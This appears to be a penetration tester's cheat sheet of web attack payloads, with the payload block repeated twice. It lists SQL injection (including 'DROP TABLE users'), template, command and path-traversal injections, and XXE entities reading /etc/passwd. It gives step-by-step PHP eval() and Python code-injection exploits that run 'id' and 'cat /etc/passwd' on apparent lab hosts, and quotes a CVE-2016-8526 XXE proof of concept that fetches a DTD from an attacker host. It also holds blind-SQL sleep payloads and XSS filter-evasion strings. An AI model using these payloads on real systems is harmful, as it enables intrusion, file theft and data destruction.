Payloads for Testing


Basic Arithmetic Operations:

"label": "{{5+5}}"
"label": "{{10-3}}"
"label": "{{4/2}}"
"label": "{{8%3}}"



String Manipulation:

"label": "{{'test'.toUpperCase()}}"
"label": "{{'test'.length}}"
"label": "{{'test'.charAt(1)}}"



JavaScript Expressions:

"label": "{{alert(1)}}"
"label": "{{document.cookie}}"
"label": "{{window.location}}"



SQL Injection:

"label": "'; DROP TABLE users; --"
"label": "' OR '1'='1"
"label": "' UNION SELECT null, null, null --"



Path Traversal:

"label": "../../etc/passwd"
"label": "../../../../../../windows/system32/drivers/etc/hosts"



Command Injection:

"label": "; ls -la"
"label": "| cat /etc/passwd"
"label": "&& whoami"



XML Injection:

"label": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
"label": "<foo>&xxe;</foo>"



JSON Injection:

"label": "{\"key\": \"value\", \"injected\": \"{{7*7}}\"}"



Payloads for Testing


Basic Arithmetic Operations:

"label": "{{5+5}}"
"label": "{{10-3}}"
"label": "{{4/2}}"
"label": "{{8%3}}"



String Manipulation:

"label": "{{'test'.toUpperCase()}}"
"label": "{{'test'.length}}"
"label": "{{'test'.charAt(1)}}"



JavaScript Expressions:

"label": "{{alert(1)}}"
"label": "{{document.cookie}}"
"label": "{{window.location}}"



SQL Injection:

"label": "'; DROP TABLE users; --"
"label": "' OR '1'='1"
"label": "' UNION SELECT null, null, null --"



Path Traversal:

"label": "../../etc/passwd"
"label": "../../../../../../windows/system32/drivers/etc/hosts"



Command Injection:

"label": "; ls -la"
"label": "| cat /etc/passwd"
"label": "&& whoami"



XML Injection:

"label": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
"label": "<foo>&xxe;</foo>"



JSON Injection:

"label": "{\"key\": \"value\", \"injected\": \"{{7*7}}\"}"


<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<root>
    <name>test</name>
    <tel>028</tel>
    <email>&file;</email>
    <password>pwd</password>
</root>


1.Open the firefox  browser and go to the website
2.Add " codes at the end of the url for eg. - demo.libcurl.so?name=hacker"  and if we get below error

Parse error:syntax error, unexpected '!', expecting ','or ';' in /var/www/index.php(16):
eval()'d code on line x

3. Then we  will get to know that it is a php code with eval() and  Now we  will balance the query by adding "."  or ".." at the end of the url.
If the code error displayed before disappears, then we have successfully balanced the query.

4. Now we can try executing system commands in the url.
 like : ".system("uname -a")."   OR   ".system("id")."

 demo.libcurl.so?name=hacker".system("uname -a")." or hacker".system("id")."

If we are able to see system information like uname or id, then there is a code execution.
 
 
 	
Insert below code to retrive /etc/passwd contents
 1. Change the content type to text/xml then insert below code. Check via repeater
 
 <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE chintan [ 
  <!ELEMENT chintan ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><chintan>&xxe;</foo>
 
 
 Instance 2
 
 Proof of concept:
 -----------------
 1) XML External Entity Injection (CVE-2016-8526)
 a) XXE in VisualRF Backup Sites
 
 Login as any user role (including read-only/standard user)
 Navigate to VisualRF > Floor Plans > Select 'View' under 'Network' section.
 Select a campus (e.g. Default Campus) > Select 'Edit' >
 Select action 'Export Floor Plans' > Ok
 
 POST /visualrf/backup_sites HTTP/1.1
 Host: <AirWaveHost>
 [...]
 
 xml=<?xml version="1.0" encoding="UTF-8" ?><!DOCTYPE x [<!ENTITY %25 foo SYSTEM
 "http://<AttackerHost>:1234/sectest.dtd">%25%66%6f%6f%3b%25%70%61%72%61%6d%31%3b]><visualrf:sites
 xmlns:visualrf="http://www.airwave.com/";








Oracle	dbms_pipe.receive_message(('a'),10)
Microsoft	WAITFOR DELAY '0:0:10'
PostgreSQL	SELECT pg_sleep(10)
MySQL	SELECT SLEEP(10)

 
 	
ASP.NET IE9 chintan Filter evasion for htmlentities
 &lt;%tag style=”chintan:expression(alert(‘chintan’))”&gt;
 ‹%tag style=”chintan:expression(alert(123))”
 ‹%tag style=”chintan:expression(alert(123))”

"%2b"
"%2b"plop"%2b"

try 1+1 i.e; "%2b1%2b1%2b" ->error

try "%2bstr(1%2b1)%2b"

if we get the result i.e; 1+1 2 then its working

Now try 

"%2bstr(__import__('os').system("id"))%2b"

now try https://ptl-d69be1d122d0-5101a1c52c66.libcurl.me/hello/hacker%22%2bstr(__import__('os').popen(%22id%22).read())%2b%22


https://ptl-d69be1d122d0-5101a1c52c66.libcurl.me/hello/hacker%22%2bstr(__import__('os').popen(%22cat%20/etc/passwd%22).read())%2b%22
